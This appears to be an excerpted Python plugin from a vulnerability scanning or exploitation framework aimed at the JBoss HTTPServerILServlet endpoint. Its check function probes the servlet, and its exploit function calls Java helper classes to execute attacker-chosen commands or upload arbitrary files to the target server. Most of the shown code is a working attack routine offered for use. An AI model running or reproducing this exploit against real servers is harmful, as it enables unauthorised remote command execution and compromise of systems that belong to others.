...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    ...
    #Error_Info无论何时都会输出
        ...
        status = requests.post(url+"/jbossmq-httpil/HTTPServerILServlet", headers=heads, verify=False)
        status = status.status_code
        if status == 200:
            result['Result'] =True
            result['Result_Info']= "/jbossmq-httpil/HTTPServerILServlet"
        return result
...
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    ...
    #Error_Info无论何时都会输出
        ...
        if exp_data['type']=='cmd':
            popen = subprocess.Popen(['java', '-cp', SETUP_DIR,'com.jboss.main.main3', url, exp_data['command']], stdout=subprocess.PIPE)
        ...
        if exp_data['type']=='uploadfile':
            popen = subprocess.Popen(['java', '-cp', SETUP_DIR,'com.jboss.main.mainupload3', url, exp_data['filename'],base64.b64encode(exp_data['filename_contents'])], stdout=subprocess.PIPE)
